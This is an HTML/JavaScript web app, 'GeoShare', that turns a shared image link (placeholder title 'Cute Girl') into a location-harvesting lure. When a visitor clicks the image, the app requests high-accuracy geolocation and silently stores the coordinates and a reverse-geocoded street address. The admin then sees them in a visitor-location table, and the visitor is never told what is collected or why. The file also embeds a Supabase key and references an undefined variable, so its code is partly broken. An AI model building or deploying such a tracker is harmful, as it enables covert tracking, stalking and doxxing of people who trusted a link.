<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>GeoShare</title>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<style>
*{
    box-sizing:border-box;
    margin:0;
    padding:0;
}

html,body{
    width:100%;
    min-height:100%;
    background:#000;
}

body{
    font-family:Arial,Helvetica,sans-serif;
}

/* =====================================================
   ADMIN
===================================================== */

#adminPage{
    min-height:100vh;
    background:
        radial-gradient(circle at top,#18204a,#060914 55%);
    color:#fff;
    padding:25px;
}

.admin-container{
    width:min(1150px,95%);
    margin:auto;
}

.header{
    padding:25px;
    border-radius:22px;
    background:#10162a;
    border:1px solid rgba(255,255,255,.08);
    margin-bottom:20px;
}

.header h1{
    font-size:28px;
}

.header p{
    color:#94a3b8;
    margin-top:6px;
}

.card{
    background:#10162a;
    border:1px solid rgba(255,255,255,.08);
    border-radius:20px;
    padding:22px;
    margin-bottom:20px;
}

label{
    display:block;
    margin:15px 0 8px;
    font-weight:700;
}

input[type=text]{
    width:100%;
    padding:14px;
    border-radius:12px;
    border:1px solid rgba(255,255,255,.1);
    background:#070b16;
    color:#fff;
    outline:none;
}

.upload{
    padding:30px;
    border:2px dashed #5557ff;
    border-radius:18px;
    text-align:center;
    cursor:pointer;
    color:#cbd5e1;
}

.upload-icon{
    font-size:40px;
    margin-bottom:8px;
}

.preview{
    display:none;
    width:100%;
    max-height:400px;
    object-fit:contain;
    margin-top:15px;
    border-radius:15px;
}

button{
    border:0;
    border-radius:12px;
    padding:14px 18px;
    color:#fff;
    font-weight:700;
    cursor:pointer;
}

.primary{
    width:100%;
    margin-top:16px;
    background:linear-gradient(135deg,#6366f1,#8b5cf6);
}

.secondary{
    background:#202a45;
}

.result{
    display:none;
    margin-top:18px;
    padding:18px;
    background:#0b1020;
    border-radius:15px;
}

.link{
    margin-top:10px;
    padding:12px;
    background:#050811;
    border-radius:10px;
    word-break:break-all;
    color:#c7d2fe;
    font-size:13px;
}

.actions{
    display:flex;
    gap:10px;
    margin-top:10px;
}

.actions button{
    flex:1;
}

.table-wrap{
    overflow:auto;
}

table{
    width:100%;
    min-width:1100px;
    border-collapse:collapse;
}

th,td{
    padding:12px;
    border-bottom:1px solid rgba(255,255,255,.08);
    text-align:left;
    font-size:13px;
}

th{
    color:#a5b4fc;
    background:#080d19;
}

/* =====================================================
   VISITOR PAGE
===================================================== */

#visitorPage{
    display:none;
    min-height:100vh;
    width:100%;
    background:#000;
}

/*
    Visitor sees ONLY image.
*/

#visitorImage{
    display:block;
    width:100%;
    height:100vh;
    object-fit:contain;
    background:#000;
    cursor:pointer;
    user-select:none;
    -webkit-user-select:none;
}

/*
    No custom location UI.
*/

.hidden{
    display:none!important;
}


/* =====================================================
   MOBILE
===================================================== */

@media(max-width:700px){

    #adminPage{
        padding:14px;
    }

    .card{
        padding:17px;
    }

    .header h1{
        font-size:23px;
    }

    .actions{
        flex-direction:column;
    }

}
</style>
</head>


<body>


<!-- =====================================================
     ADMIN PAGE
===================================================== -->

<div id="adminPage">

<div class="admin-container">

<div class="header">

<h1>📍 GeoShare</h1>

<p>
Image sharing with explicit browser location permission
</p>

</div>


<!-- CREATE LINK -->

<div class="card">

<h2>✨ Create Share Link</h2>


<label>
Image Title
</label>

<input
    id="title"
    type="text"
    placeholder="Example: Cute Girl"
>


<label>
Select Image
</label>


<div
    class="upload"
    onclick="document.getElementById('imageInput').click()"
>

<div class="upload-icon">
🖼️
</div>

<strong>
Choose Image
</strong>

<br>

<small>
JPG / PNG / WEBP / GIF — Max 10MB
</small>

<input
    id="imageInput"
    type="file"
    accept="image/jpeg,image/png,image/webp,image/gif"
    hidden
>

</div>


<img
    id="preview"
    class="preview"
>


<button
    id="generateButton"
    class="primary"
    onclick="createShare()"
>
🔗 Generate Share Link
</button>


<div
    id="result"
    class="result"
>

<strong>
✅ Share link created
</strong>


<div
    id="generatedLink"
    class="link"
></div>


<div class="actions">

<button
    class="secondary"
    onclick="copyLink()"
>
📋 Copy
</button>


<button
    class="secondary"
    onclick="openLink()"
>
↗️ Open
</button>

</div>

</div>

</div>



<!-- LOCATION TABLE -->

<div class="card">

<h2>
📊 Visitor Locations
</h2>

<br>

<div class="table-wrap">

<table>

<thead>

<tr>

<th>Title</th>
<th>Latitude</th>
<th>Longitude</th>
<th>Accuracy</th>
<th>Address</th>
<th>City</th>
<th>State</th>
<th>Pincode</th>
<th>Country</th>
<th>Time</th>

</tr>

</thead>


<tbody id="locationTable">

<tr>

<td colspan="10">
Loading...
</td>

</tr>

</tbody>

</table>

</div>

</div>


</div>

</div>



<!-- =====================================================
     VISITOR PAGE
===================================================== -->

<div id="visitorPage">

<img
    id="visitorImage"
    alt="Shared Image"
    draggable="false"
>

</div>



<script>

/* =====================================================
   SUPABASE
===================================================== */

const SUPABASE_URL =
    "https://hglehcluiqgbjbtvwsbh.supabase.co";


const SUPABASE_ANON_KEY =
    "sb_publishable__rcgeXfzaLjEK5eyds8qMA_QIqqApPU";



let supabaseClient = null;

if(
    SUPABASE_KEY &&
    SUPABASE_KEY !==
    "PASTE_YOUR_PUBLISHABLE_KEY_HERE"
){

    supabaseClient =
    window.supabase.createClient(
        SUPABASE_URL,
        SUPABASE_KEY
    );

}


/* =====================================================
   GLOBAL
===================================================== */

let selectedFile = null;

let currentShareId = null;


/* =====================================================
   START
===================================================== */

document.addEventListener(
"DOMContentLoaded",
async function(){

    const params =
    new URLSearchParams(
        window.location.search
    );

    const id =
    params.get("id");


    /*
        ID exists
        =
        VISITOR
    */

    if(id){

        currentShareId = id;

        document
        .getElementById("adminPage")
        .style.display = "none";

        document
        .getElementById("visitorPage")
        .style.display = "block";

        await loadVisitorImage();

    }

    /*
        No ID
        =
        ADMIN
    */

    else{

        await loadLocations();

    }

});


/* =====================================================
   IMAGE PREVIEW
===================================================== */

document
.getElementById("imageInput")
.addEventListener(
"change",
function(){

    const file =
    this.files[0];

    if(!file)
        return;


    if(!file.type.startsWith("image/")){

        alert(
            "Please select an image."
        );

        return;

    }


    if(
        file.size >
        10 * 1024 * 1024
    ){

        alert(
            "Maximum image size is 10MB."
        );

        return;

    }


    selectedFile =
    file;


    const reader =
    new FileReader();


    reader.onload =
    function(e){

        const preview =
        document.getElementById(
            "preview"
        );

        preview.src =
        e.target.result;

        preview.style.display =
        "block";

    };


    reader.readAsDataURL(
        file
    );

});


/* =====================================================
   CREATE SHARE
===================================================== */

async function createShare(){

    if(!supabaseClient){

        alert(
            "Supabase key is missing."
        );

        return;

    }


    const title =
    document
    .getElementById("title")
    .value
    .trim();


    if(!title){

        alert(
            "Please enter image title."
        );

        return;

    }


    if(!selectedFile){

        alert(
            "Please select image."
        );

        return;

    }


    const button =
    document.getElementById(
        "generateButton"
    );


    button.disabled =
    true;

    button.textContent =
    "⏳ Uploading...";


    try{

        const id =
        crypto.randomUUID();


        const extension =
        getExtension(
            selectedFile.name
        );


        const filePath =
        id +
        "." +
        extension;


        /* =============================================
           UPLOAD IMAGE
        ============================================= */

        const upload =
        await supabaseClient
        .storage
        .from("images")
        .upload(
            filePath,
            selectedFile,
            {
                cacheControl:"3600",
                contentType:selectedFile.type,
                upsert:false
            }
        );


        if(upload.error)
            throw upload.error;


        /* =============================================
           PUBLIC IMAGE URL
        ============================================= */

        const publicUrl =
        supabaseClient
        .storage
        .from("images")
        .getPublicUrl(
            filePath
        )
        .data
        .publicUrl;


        /* =============================================
           SAVE SHARE
        ============================================= */

        const save =
        await supabaseClient
        .from("shares")
        .insert({

            id:id,

            title:title,

            image_url:publicUrl

        });


        if(save.error)
            throw save.error;


        /* =============================================
           LINK
        ============================================= */

        const shareUrl =
        window.location.origin +
        window.location.pathname +
        "?share=" +
        encodeURIComponent(title) +
        "&id=" +
        encodeURIComponent(id);


        document
        .getElementById("generatedLink")
        .textContent =
        shareUrl;


        document
        .getElementById("result")
        .style.display =
        "block";


        button.textContent =
        "✅ Link Generated";


        await loadLocations();

    }

    catch(error){

        console.error(error);

        alert(
            "❌ " +
            (
                error.message ||
                "Something went wrong."
            )
        );

        button.textContent =
        "🔗 Generate Share Link";

    }

    finally{

        button.disabled =
        false;

    }

}


/* =====================================================
   VISITOR IMAGE
===================================================== */

async function loadVisitorImage(){

    if(!supabaseClient)
        return;


    try{

        const result =
        await supabaseClient
        .from("shares")
        .select(
            "id,title,image_url"
        )
        .eq(
            "id",
            currentShareId
        )
        .maybeSingle();


        if(result.error)
            throw result.error;


        if(!result.data){

            document
            .getElementById(
                "visitorImage"
            )
            .alt =
            "Image not found";

            return;

        }


        /*
            ONLY IMAGE
        */

        document
        .getElementById(
            "visitorImage"
        )
        .src =
        result.data.image_url;


        /*
            IMPORTANT:

            We DO NOT automatically request
            location on page load.

            The visitor must interact with
            the image first.
        */

    }

    catch(error){

        console.error(
            "Image load error:",
            error
        );

    }

}


/* =====================================================
   IMAGE CLICK
===================================================== */

document
.getElementById("visitorImage")
.addEventListener(
"click",
function(){

    /*
        The visitor's click is the explicit
        action that triggers the browser's
        native permission dialog.

        There is NO custom permission UI.
    */

    requestLocation();

});


/* =====================================================
   NATIVE BROWSER LOCATION PERMISSION
===================================================== */

function requestLocation(){

    if(!supabaseClient)
        return;


    if(!currentShareId)
        return;


    if(
        !navigator.geolocation
    )
        return;


    /*
        THIS triggers the browser's
        native location permission prompt.
    */

    navigator
    .geolocation
    .getCurrentPosition(

        async function(position){

            const latitude =
            position.coords.latitude;


            const longitude =
            position.coords.longitude;


            const accuracy =
            position.coords.accuracy;


            const visitedAt =
            new Date().toISOString();


            try{

                /*
                    Reverse geocode
                */

                const location =
                await reverseGeocode(
                    latitude,
                    longitude
                );


                /*
                    SAVE ONLY AFTER
                    USER ALLOWED LOCATION
                */

                const save =
                await supabaseClient
                .from(
                    "visitor_locations"
                )
                .insert({

                    share_id:
                    currentShareId,

                    latitude:
                    latitude,

                    longitude:
                    longitude,

                    accuracy:
                    accuracy,

                    address:
                    location.address || "",

                    city:
                    location.city || "",

                    state:
                    location.state || "",

                    postcode:
                    location.postcode || "",

                    country:
                    location.country || "",

                    visited_at:
                    visitedAt

                });


                if(save.error){

                    console.error(
                        "Location save failed:",
                        save.error
                    );

                }

                /*
                    Nothing is displayed
                    to the visitor.

                    Image remains visible.
                */

            }

            catch(error){

                console.error(
                    "Location error:",
                    error
                );

            }

        },


        function(error){

            /*
                User selected Deny / location unavailable.

                Do nothing.

                Image remains visible.
            */

            console.log(
                "Location permission result:",
                error.code
            );

        },


        {

            enableHighAccuracy:true,

            timeout:20000,

            maximumAge:0

        }

    );

}


/* =====================================================
   REVERSE GEOCODE
===================================================== */

async function reverseGeocode(
    latitude,
    longitude
){

    const url =
    "https://nominatim.openstreetmap.org/reverse" +

    "?format=jsonv2" +

    "&lat=" +
    encodeURIComponent(
        latitude
    ) +

    "&lon=" +
    encodeURIComponent(
        longitude
    ) +

    "&addressdetails=1" +

    "&zoom=18";


    const response =
    await fetch(url);


    if(!response.ok){

        throw new Error(
            "Address lookup failed."
        );

    }


    const data =
    await response.json();


    const a =
    data.address || {};


    const city =
    a.city ||
    a.town ||
    a.village ||
    a.municipality ||
    a.suburb ||
    "";


    const state =
    a.state ||
    a.state_district ||
    "";


    let postcode =
    a.postcode ||
    "";


    const country =
    a.country ||
    "";


    const address =
    data.display_name ||
    [

        a.house_number,

        a.road,

        a.neighbourhood,

        a.suburb,

        city,

        state,

        postcode,

        country

    ]
    .filter(Boolean)
    .join(", ");


    /*
        India PIN fallback
    */

    if(
        !postcode &&
        country.toLowerCase() ===
        "india"
    ){

        const match =
        String(address)
        .match(
            /\b[1-9][0-9]{5}\b/
        );


        if(match){

            postcode =
            match[0];

        }

    }


    return {

        address:
        address,

        city:
        city,

        state:
        state,

        postcode:
        postcode,

        country:
        country

    };

}


/* =====================================================
   LOAD ADMIN LOCATIONS
===================================================== */

async function loadLocations(){

    if(!supabaseClient)
        return;


    const table =
    document.getElementById(
        "locationTable"
    );


    try{

        const result =
        await supabaseClient
        .from("visitor_locations")
        .select(
        `
            id,
            share_id,
            latitude,
            longitude,
            accuracy,
            address,
            city,
            state,
            postcode,
            country,
            visited_at,
            shares(title)
        `
        )
        .order(
            "visited_at",
            {
                ascending:false
            }
        );


        if(result.error)
            throw result.error;


        const rows =
        result.data || [];


        if(!rows.length){

            table.innerHTML = `

                <tr>

                    <td colspan="10">

                        No consented locations yet.

                    </td>

                </tr>

            `;

            return;

        }


        table.innerHTML =
        rows
        .map(
        function(row){

            const title =
            row.shares &&
            row.shares.title
            ?
            row.shares.title
            :
            "Unknown";


            const time =
            row.visited_at
            ?
            new Date(
                row.visited_at
            ).toLocaleString()
            :
            "-";


            return `

            <tr>

                <td>
                    ${escapeHtml(title)}
                </td>

                <td>
                    ${formatNumber(row.latitude)}
                </td>

                <td>
                    ${formatNumber(row.longitude)}
                </td>

                <td>
                    ${
                        row.accuracy != null
                        ?
                        Math.round(
                            row.accuracy
                        ) + " m"
                        :
                        "-"
                    }
                </td>

                <td>
                    ${escapeHtml(
                        row.address || "-"
                    )}
                </td>

                <td>
                    ${escapeHtml(
                        row.city || "-"
                    )}
                </td>

                <td>
                    ${escapeHtml(
                        row.state || "-"
                    )}
                </td>

                <td>
                    ${escapeHtml(
                        row.postcode || "-"
                    )}
                </td>

                <td>
                    ${escapeHtml(
                        row.country || "-"
                    )}
                </td>

                <td>
                    ${escapeHtml(time)}
                </td>

            </tr>

            `;

        })
        .join("");

    }

    catch(error){

        console.error(
            "Table error:",
            error
        );


        table.innerHTML = `

        <tr>

            <td colspan="10">

                ❌
                ${escapeHtml(
                    error.message
                )}

            </td>

        </tr>

        `;

    }

}


/* =====================================================
   COPY
===================================================== */

async function copyLink(){

    const link =
    document
    .getElementById(
        "generatedLink"
    )
    .textContent;


    if(!link)
        return;


    await navigator
    .clipboard
    .writeText(link);


    alert(
        "✅ Link copied!"
    );

}


/* =====================================================
   OPEN
===================================================== */

function openLink(){

    const link =
    document
    .getElementById(
        "generatedLink"
    )
    .textContent;


    if(link)
        window.open(
            link,
            "_blank"
        );

}


/* =====================================================
   EXTENSION
===================================================== */

function getExtension(
    filename
){

    const ext =
    filename
    .split(".")
    .pop()
    .toLowerCase();


    if(
        [
            "jpg",
            "jpeg",
            "png",
            "webp",
            "gif"
        ].includes(ext)
    ){

        return ext;

    }


    return "jpg";

}


/* =====================================================
   NUMBER
===================================================== */

function formatNumber(
    value
){

    if(
        value === null ||
        value === undefined
    ){

        return "-";

    }


    return Number(value)
    .toFixed(6);

}


/* =====================================================
   HTML ESCAPE
===================================================== */

function escapeHtml(
    value
){

    return String(value)

    .replaceAll(
        "&",
        "&amp;"
    )

    .replaceAll(
        "<",
        "&lt;"
    )

    .replaceAll(
        ">",
        "&gt;"
    )

    .replaceAll(
        '"',
        "&quot;"
    )

    .replaceAll(
        "'",
        "&#039;"
    );

}

</script>

</body>
</html>
